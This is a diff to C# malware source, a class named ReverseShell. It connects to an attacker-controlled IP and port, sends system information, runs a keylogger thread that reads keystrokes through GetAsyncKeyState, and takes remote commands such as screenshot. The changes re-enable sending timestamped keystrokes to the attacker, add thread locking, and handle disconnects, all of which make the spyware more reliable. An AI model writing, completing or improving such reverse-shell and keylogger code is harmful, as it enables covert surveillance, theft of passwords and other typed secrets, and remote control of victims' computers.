@@ -97,27 +97,32 @@ class ReverseShell
     static void Keylogger(StreamWriter writer)
     {
         StringBuilder logBuffer = new StringBuilder();
+        object writerLock = new object();
 
         while (true)
         {
             Thread.Sleep(50);
             for (int i = 0; i < 255; i++)
             {
-                if (GetAsyncKeyState(i) == -32767)
+                if (GetAsyncKeyState(i) == -32767) 
                 {
                     string key = ConvertKey(i);
 
                     if (!string.IsNullOrEmpty(key))
                     {
                         logBuffer.Append(key);
+                        //Console.WriteLine($"Key pressed: {key}"); 
 
-                        if (key == "[ENTER]")
+                        if (key == "[ENTER]")  
                         {
                             if (logBuffer.Length > 0)
                             {
                                 string logEntry = $"[{DateTime.Now:yyyy-MM-dd HH:mm:ss}] {logBuffer.ToString()}";
-                                //writer.WriteLine("[KEYLOG] " + logEntry);
-                                writer.Flush();
+                                lock (writerLock) 
+                                {
+                                    writer.WriteLine("[KEYLOG] " + logEntry);
+                                    writer.Flush();
+                                }
                                 logBuffer.Clear();
                             }
                         }
@@ -137,20 +142,32 @@ class ReverseShell
 
         try
         {
+            //Console.WriteLine("[+] Attempting to connect to server..."); 
             using (TcpClient client = new TcpClient(attackerIP, attackerPort))
             using (NetworkStream stream = client.GetStream())
             using (StreamReader reader = new StreamReader(stream))
             using (StreamWriter writer = new StreamWriter(stream))
             {
                 writer.AutoFlush = true;
-                writer.WriteLine(GetSystemInfo());
+                //Console.WriteLine("[+] Connected to server."); 
+
+                string systemInfo = GetSystemInfo();
+                writer.WriteLine(systemInfo);
+                //Console.WriteLine("[+] System info sent to server."); 
 
                 Thread keyloggerThread = new Thread(() => Keylogger(writer));
                 keyloggerThread.Start();
+                //Console.WriteLine("[+] Keylogger thread started.");
 
                 while (true)
                 {
                     string command = reader.ReadLine();
+                    if (command == null)
+                    {
+                        Console.WriteLine("[-] Server disconnected."); 
+                        break;
+                    }
+
                     if (command.ToLower() == "exit") break;
 
                     if (command.ToLower() == "screenshot")
